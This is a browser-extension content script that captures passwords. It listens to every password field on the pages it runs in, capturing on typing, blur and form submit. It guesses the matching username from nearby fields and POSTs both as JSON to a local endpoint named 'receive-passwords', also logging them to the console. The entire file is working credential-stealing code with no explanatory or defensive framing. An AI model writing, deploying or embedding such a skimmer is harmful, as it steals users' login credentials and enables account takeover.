// content.js

function getUsername(inputElem) {
  if (inputElem.form) {
    const inputs = inputElem.form.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
    for (let input of inputs) {
      if (input.value) return input.value;
    }
  }

  const possibleUsernames = document.querySelectorAll('input[name*=user], input[name*=email], input[id*=user], input[id*=email]');
  for (let input of possibleUsernames) {
    if (input.value) return input.value;
  }

  return null;
}

function sendCredentials(username, password) {
  fetch('http://localhost:3000/receive-passwords', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ credentials: [{ username, password }] })
  })
  .then(res => {
    if (res.ok) {
      console.log("[content.js] Credentials sent successfully.");
    } else {
      console.error("[content.js] Failed to send credentials.");
    }
  })
  .catch(err => console.error("[content.js] Error sending credentials:", err));
}

let debounceTimeout;

function captureAndSend(inputElem) {
  const pwd = inputElem.value;
  if (!pwd) return;
  const user = getUsername(inputElem) || "UNKNOWN";
  sendCredentials(user, pwd);
  console.log("[content.js] Credentials sent:", { username: user, password: pwd });
}

document.addEventListener("input", (event) => {
  if (event.target.type === "password") {
    clearTimeout(debounceTimeout);
    debounceTimeout = setTimeout(() => captureAndSend(event.target), 500);
  }
});

document.querySelectorAll('input[type="password"]').forEach(input => {
  input.addEventListener('blur', () => captureAndSend(input));
  if (input.form) {
    input.form.addEventListener('submit', () => captureAndSend(input));
  }
});
